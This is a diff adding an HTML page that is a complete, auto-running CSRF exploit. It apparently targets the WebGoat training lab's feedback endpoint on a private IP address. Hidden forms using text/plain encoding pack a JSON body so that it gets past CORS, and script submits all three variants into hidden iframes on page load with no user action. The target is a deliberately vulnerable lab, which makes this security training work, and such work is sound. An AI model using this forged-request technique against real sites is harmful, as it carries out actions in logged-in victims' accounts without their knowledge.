@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF JSON - Auto Attack</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 { color: #d32f2f; }
+        .status {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ CSRF JSON Auto-Attack</h1>
+        
+        <div class="status">
+            <strong>Status:</strong> <span id="status">Preparing attack...</span>
+        </div>
+        
+        <p><strong>Target:</strong> <code>http://192.168.254.112:8001/WebGoat/csrf/feedback/message</code></p>
+        
+        <p><strong>Payload:</strong></p>
+        <pre>{
+  "name": "WebGoat",
+  "email": "webgoat@webgoat.org", 
+  "content": "WebGoat is the best!!"
+}</pre>
+
+        <p><strong>⚠️ Make sure you're logged into WebGoat first!</strong></p>
+        
+        <div id="result"></div>
+    </div>
+
+    <!-- Method 1: Basic text/plain form -->
+    <form id="attack1" method="POST" 
+          action="http://192.168.254.112:8001/WebGoat/csrf/feedback/message"
+          enctype="text/plain" target="result1" style="display:none;">
+        <input type="hidden" 
+               name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","ignore":"' 
+               value='"}' />
+    </form>
+    <iframe name="result1" id="result1" style="display:none;"></iframe>
+
+    <!-- Method 2: Compact JSON -->
+    <form id="attack2" method="POST" 
+          action="http://192.168.254.112:8001/WebGoat/csrf/feedback/message"
+          enctype="text/plain" target="result2" style="display:none;">
+        <input type="hidden" 
+               name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!"}'
+               value='' />
+    </form>
+    <iframe name="result2" id="result2" style="display:none;"></iframe>
+
+    <!-- Method 3: With newlines (some servers prefer this) -->
+    <form id="attack3" method="POST" 
+          action="http://192.168.254.112:8001/WebGoat/csrf/feedback/message"
+          enctype="text/plain" target="result3" style="display:none;">
+        <input type="hidden" 
+               name='{"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "x": "'
+               value='"}' />
+    </form>
+    <iframe name="result3" id="result3" style="display:none;"></iframe>
+
+    <script>
+        let attemptCount = 0;
+        const methods = [
+            { id: 'attack1', desc: 'Standard text/plain with ignore field' },
+            { id: 'attack2', desc: 'Compact JSON format' },
+            { id: 'attack3', desc: 'JSON with spacing and x field' }
+        ];
+
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+            console.log(msg);
+        }
+
+        function tryAttack(index) {
+            if (index >= methods.length) {
+                updateStatus('All 3 methods executed! Check WebGoat for success.');
+                showResults();
+                return;
+            }
+
+            const method = methods[index];
+            updateStatus(`Executing Method ${index + 1}: ${method.desc}`);
+            
+            const form = document.getElementById(method.id);
+            HTMLFormElement.prototype.submit.call(form);
+            
+            // Wait 2 seconds before next attempt
+            setTimeout(() => tryAttack(index + 1), 2000);
+        }
+
+        function showResults() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `
+                <div style="margin-top: 20px; padding: 15px; background: #e8f5e9; border-radius: 5px;">
+                    <h3>✅ Attack Complete!</h3>
+                    <p><strong>3 different methods were tried:</strong></p>
+                    <ol>
+                        <li>Standard JSON with "ignore" field to absorb the "="</li>
+                        <li>Compact JSON format (no extra fields)</li>
+                        <li>JSON with spacing and "x" field</li>
+                    </ol>
+                    <p><strong>Next steps:</strong></p>
+                    <ul>
+                        <li>Go to WebGoat and check if the lesson is marked complete</li>
+                        <li>Look for a flag or success message</li>
+                        <li>Check the browser console (F12) for any response data</li>
+                    </ul>
+                </div>
+            `;
+        }
+
+        // Auto-execute on page load
+        window.onload = function() {
+            updateStatus('Starting attack in 2 seconds...');
+            console.log('=== CSRF JSON POST ATTACK ===');
+            console.log('Target: http://192.168.254.112:8001/WebGoat/csrf/feedback/message');
+            console.log('Using ENCTYPE=text/plain to bypass CORS');
+            
+            setTimeout(() => {
+                tryAttack(0);
+            }, 2000);
+        };
+
+        // Listen for iframe responses
+        ['result1', 'result2', 'result3'].forEach((name, index) => {
+            const iframe = document.getElementById(name);
+            iframe.onload = function() {
+                try {
+                    const content = iframe.contentDocument || iframe.contentWindow.document;
+                    console.log(`Method ${index + 1} response:`, content.body.innerHTML);
+                } catch (e) {
+                    console.log(`Method ${index + 1} submitted (CORS prevents reading response)`);
+                }
+            };
+        });
+    </script>
+</body>
+</html>
